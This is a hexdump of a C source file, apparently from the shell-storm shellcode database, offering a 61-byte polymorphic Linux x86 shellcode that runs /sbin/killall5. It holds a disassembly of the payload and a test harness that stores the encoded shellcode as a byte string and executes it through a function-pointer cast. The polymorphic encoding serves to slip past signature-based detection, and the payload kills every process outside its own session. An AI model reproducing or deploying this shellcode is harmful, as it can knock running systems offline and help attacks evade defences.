00000000  2f 2a 0d 0a 20 20 20 54  69 74 6c 65 3a 09 4c 69  |/*..   Title:.Li|
00000010  6e 75 78 20 78 38 36 20  7c 20 50 6f 6c 79 6d 6f  |nux x86 | Polymo|
00000020  72 70 68 69 63 20 53 68  65 6c 6c 63 6f 64 65 20  |rphic Shellcode |
00000030  6b 69 6c 6c 61 6c 6c 35  20 2d 20 36 31 20 62 79  |killall5 - 61 by|
00000040  74 65 73 0d 0a 20 20 20  41 75 74 68 6f 72 3a 20  |tes..   Author: |
00000050  09 4a 6f 6e 61 74 68 61  6e 20 53 61 6c 77 61 6e  |.Jonathan Salwan|
00000060  0d 0a 20 20 20 4d 61 69  6c 3a 09 73 75 62 6d 69  |..   Mail:.submi|
00000070  74 20 5b 21 5d 20 73 68  65 6c 6c 2d 73 74 6f 72  |t [!] shell-stor|
00000080  6d 2e 6f 72 67 0d 0a 20  20 20 0d 0a 09 21 20 44  |m.org..   ...! D|
00000090  61 74 61 42 61 73 65 20  6f 66 20 73 68 65 6c 6c  |ataBase of shell|
000000a0  63 6f 64 65 20 3d 3d 3e  20 68 74 74 70 3a 2f 2f  |code ==> http://|
000000b0  77 77 77 2e 73 68 65 6c  6c 2d 73 74 6f 72 6d 2e  |www.shell-storm.|
000000c0  6f 72 67 2f 73 68 65 6c  6c 63 6f 64 65 2f 0d 0a  |org/shellcode/..|
000000d0  0d 0a 0d 0a 20 20 20 6b  69 6c 6c 61 6c 6c 35 20  |....   killall5 |
000000e0  69 73 20 74 68 65 20 53  79 73 74 65 6d 56 20 6b  |is the SystemV k|
000000f0  69 6c 6c 61 6c 6c 20 63  6f 6d 6d 61 6e 64 2e 20  |illall command. |
00000100  49 74 20 73 65 6e 64 73  20 61 20 73 69 67 6e 61  |It sends a signa|
00000110  6c 20 74 6f 20 61 6c 6c  20 70 72 6f 63 65 73 73  |l to all process|
00000120  65 73 20 0d 0a 20 20 20  65 78 63 65 70 74 20 74  |es ..   except t|
00000130  68 65 20 70 72 6f 63 65  73 73 65 73 20 69 6e 20  |he processes in |
00000140  69 74 73 20 6f 77 6e 20  73 65 73 73 69 6f 6e 2c  |its own session,|
00000150  20 73 6f 20 69 74 20 77  6f 6e 27 74 20 6b 69 6c  | so it won't kil|
00000160  6c 20 74 68 65 20 73 68  65 6c 6c 20 74 68 61 74  |l the shell that|
00000170  20 69 73 20 0d 0a 20 20  20 72 75 6e 6e 69 6e 67  | is ..   running|
00000180  20 74 68 65 20 73 63 72  69 70 74 20 69 74 20 77  | the script it w|
00000190  61 73 20 63 61 6c 6c 65  64 20 66 72 6f 6d 2e 20  |as called from. |
000001a0  49 74 73 20 70 72 69 6d  61 72 79 20 28 6f 6e 6c  |Its primary (onl|
000001b0  79 29 20 75 73 65 20 69  73 20 69 6e 20 74 68 65  |y) use is in the|
000001c0  20 72 63 20 0d 0a 20 20  20 73 63 72 69 70 74 73  | rc ..   scripts|
000001d0  20 66 6f 75 6e 64 20 69  6e 20 74 68 65 20 2f 65  | found in the /e|
000001e0  74 63 2f 69 6e 69 74 2e  64 20 64 69 72 65 63 74  |tc/init.d direct|
000001f0  6f 72 79 2e 0d 0a 0d 0a  0d 0a 20 4f 72 69 67 69  |ory....... Origi|
00000200  6e 61 6c 20 49 6e 66 6f  72 6d 61 74 69 6f 6e 73  |nal Informations|
00000210  0d 0a 20 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |.. =============|
00000220  3d 3d 3d 3d 3d 3d 3d 3d  0d 0a 0d 0a 20 44 69 73  |========.... Dis|
00000230  61 73 73 65 6d 62 6c 79  20 6f 66 20 73 65 63 74  |assembly of sect|
00000240  69 6f 6e 20 2e 74 65 78  74 3a 0d 0a 0d 0a 20 30  |ion .text:.... 0|
00000250  38 30 34 38 30 35 34 20  3c 2e 74 65 78 74 3e 3a  |8048054 <.text>:|
00000260  0d 0a 20 38 30 34 38 30  35 34 3a 20 20 20 20 20  |.. 8048054:     |
00000270  20 20 33 31 20 63 30 20  20 20 20 20 20 20 20 20  |  31 c0         |
00000280  20 20 20 20 20 20 20 20  20 20 78 6f 72 20 20 20  |          xor   |
00000290  20 25 65 61 78 2c 25 65  61 78 0d 0a 20 38 30 34  | %eax,%eax.. 804|
000002a0  38 30 35 36 3a 20 20 20  20 20 20 20 35 30 20 20  |8056:       50  |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  20 20 20 20 70 75 73 68  20 20 20 25 65 61 78 0d  |    push   %eax.|
000002d0  0a 20 38 30 34 38 30 35  37 3a 20 20 20 20 20 20  |. 8048057:      |
000002e0  20 36 36 20 36 38 20 36  63 20 33 35 20 20 20 20  | 66 68 6c 35    |
000002f0  20 20 20 20 20 20 20 20  20 70 75 73 68 77 20 20  |         pushw  |
00000300  24 30 78 33 35 36 63 0d  0a 20 38 30 34 38 30 35  |$0x356c.. 804805|
00000310  62 3a 20 20 20 20 20 20  20 36 38 20 36 63 20 36  |b:       68 6c 6|
00000320  63 20 36 31 20 36 63 20  20 20 20 20 20 20 20 20  |c 61 6c         |
00000330  20 70 75 73 68 20 20 20  24 30 78 36 63 36 31 36  | push   $0x6c616|
00000340  63 36 63 0d 0a 20 38 30  34 38 30 36 30 3a 20 20  |c6c.. 8048060:  |
00000350  20 20 20 20 20 36 38 20  36 65 20 32 66 20 36 62  |     68 6e 2f 6b|
00000360  20 36 39 20 20 20 20 20  20 20 20 20 20 70 75 73  | 69          pus|
00000370  68 20 20 20 24 30 78 36  39 36 62 32 66 36 65 0d  |h   $0x696b2f6e.|
00000380  0a 20 38 30 34 38 30 36  35 3a 20 20 20 20 20 20  |. 8048065:      |
00000390  20 36 38 20 32 66 20 37  33 20 36 32 20 36 39 20  | 68 2f 73 62 69 |
000003a0  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
000003b0  24 30 78 36 39 36 32 37  33 32 66 0d 0a 20 38 30  |$0x6962732f.. 80|
000003c0  34 38 30 36 61 3a 20 20  20 20 20 20 20 38 39 20  |4806a:       89 |
000003d0  65 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e3              |
000003e0  20 20 20 20 20 6d 6f 76  20 20 20 20 25 65 73 70  |     mov    %esp|
000003f0  2c 25 65 62 78 0d 0a 20  38 30 34 38 30 36 63 3a  |,%ebx.. 804806c:|
00000400  20 20 20 20 20 20 20 35  30 20 20 20 20 20 20 20  |       50       |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000420  75 73 68 20 20 20 25 65  61 78 0d 0a 20 38 30 34  |ush   %eax.. 804|
00000430  38 30 36 64 3a 20 20 20  20 20 20 20 38 39 20 65  |806d:       89 e|
00000440  32 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2               |
00000450  20 20 20 20 6d 6f 76 20  20 20 20 25 65 73 70 2c  |    mov    %esp,|
00000460  25 65 64 78 0d 0a 20 38  30 34 38 30 36 66 3a 20  |%edx.. 804806f: |
00000470  20 20 20 20 20 20 35 33  20 20 20 20 20 20 20 20  |      53        |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000490  73 68 20 20 20 25 65 62  78 0d 0a 20 38 30 34 38  |sh   %ebx.. 8048|
000004a0  30 37 30 3a 20 20 20 20  20 20 20 38 39 20 65 31  |070:       89 e1|
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004c0  20 20 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |   mov    %esp,%|
000004d0  65 63 78 0d 0a 20 38 30  34 38 30 37 32 3a 20 20  |ecx.. 8048072:  |
000004e0  20 20 20 20 20 62 30 20  30 62 20 20 20 20 20 20  |     b0 0b      |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000500  20 20 20 20 24 30 78 62  2c 25 61 6c 0d 0a 20 38  |    $0xb,%al.. 8|
00000510  30 34 38 30 37 34 3a 20  20 20 20 20 20 20 63 64  |048074:       cd|
00000520  20 38 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 80             |
00000530  20 20 20 20 20 20 69 6e  74 20 20 20 20 24 30 78  |      int    $0x|
00000540  38 30 0d 0a 0d 0a 2a 2f  0d 0a 0d 0a 23 69 6e 63  |80....*/....#inc|
00000550  6c 75 64 65 20 22 73 74  64 69 6f 2e 68 22 0d 0a  |lude "stdio.h"..|
00000560  0d 0a 69 6e 74 20 6d 61  69 6e 28 69 6e 74 20 61  |..int main(int a|
00000570  72 67 63 2c 20 63 68 61  72 20 2a 61 72 67 76 5b  |rgc, char *argv[|
00000580  5d 29 0d 0a 7b 0d 0a 0d  0a 63 68 61 72 20 73 68  |])..{....char sh|
00000590  65 6c 6c 63 6f 64 65 5b  5d 20 3d 09 0d 0a 0d 0a  |ellcode[] =.....|
000005a0  09 09 09 22 5c 78 65 62  5c 78 31 31 5c 78 35 65  |..."\xeb\x11\x5e|
000005b0  5c 78 33 31 5c 78 63 39  5c 78 62 31 5c 78 33 37  |\x31\xc9\xb1\x37|
000005c0  5c 78 38 30 22 0d 0a 09  09 09 22 5c 78 36 63 5c  |\x80"....."\x6c\|
000005d0  78 30 65 5c 78 66 66 5c  78 30 31 5c 78 38 30 5c  |x0e\xff\x01\x80\|
000005e0  78 65 39 5c 78 30 31 5c  78 37 35 22 0d 0a 20 20  |xe9\x01\x75"..  |
000005f0  09 09 09 22 5c 78 66 36  5c 78 65 62 5c 78 30 35  |..."\xf6\xeb\x05|
00000600  5c 78 65 38 5c 78 65 61  5c 78 66 66 5c 78 66 66  |\xe8\xea\xff\xff|
00000610  5c 78 66 66 22 09 09 0d  0a 09 09 09 22 5c 78 33  |\xff"......."\x3|
00000620  32 5c 78 63 31 5c 78 35  31 5c 78 36 37 5c 78 36  |2\xc1\x51\x67\x6|
00000630  39 5c 78 36 64 5c 78 33  36 5c 78 36 39 22 0d 0a  |9\x6d\x36\x69"..|
00000640  09 09 09 22 5c 78 36 64  5c 78 36 64 5c 78 36 32  |..."\x6d\x6d\x62|
00000650  5c 78 36 64 5c 78 36 39  5c 78 36 66 5c 78 33 30  |\x6d\x69\x6f\x30|
00000660  5c 78 36 63 22 0d 0a 09  09 09 22 5c 78 36 61 5c  |\x6c"....."\x6a\|
00000670  78 36 39 5c 78 33 30 5c  78 37 34 5c 78 36 33 5c  |x69\x30\x74\x63\|
00000680  78 36 61 5c 78 38 61 5c  78 65 34 22 0d 0a 09 09  |x6a\x8a\xe4"....|
00000690  09 22 5c 78 35 31 5c 78  38 61 5c 78 65 33 5c 78  |."\x51\x8a\xe3\x|
000006a0  35 34 5c 78 38 61 5c 78  65 32 5c 78 62 31 5c 78  |54\x8a\xe2\xb1\x|
000006b0  30 63 22 0d 0a 09 09 09  22 5c 78 63 65 5c 78 38  |0c"....."\xce\x8|
000006c0  31 5c 78 34 31 5c 78 63  65 5c 78 38 31 22 3b 0d  |1\x41\xce\x81";.|
000006d0  0a 0d 0a 09 70 72 69 6e  74 66 28 22 4c 65 6e 67  |....printf("Leng|
000006e0  74 68 3a 20 25 64 5c 6e  22 2c 73 74 72 6c 65 6e  |th: %d\n",strlen|
000006f0  28 73 68 65 6c 6c 63 6f  64 65 29 29 3b 0d 0a 09  |(shellcode));...|
00000700  28 2a 28 76 6f 69 64 28  2a 29 28 29 29 20 73 68  |(*(void(*)()) sh|
00000710  65 6c 6c 63 6f 64 65 29  28 29 3b 0d 0a 09 0d 0a  |ellcode)();.....|
00000720  09 72 65 74 75 72 6e 20  30 3b 0d 0a 7d           |.return 0;..}|
0000072d
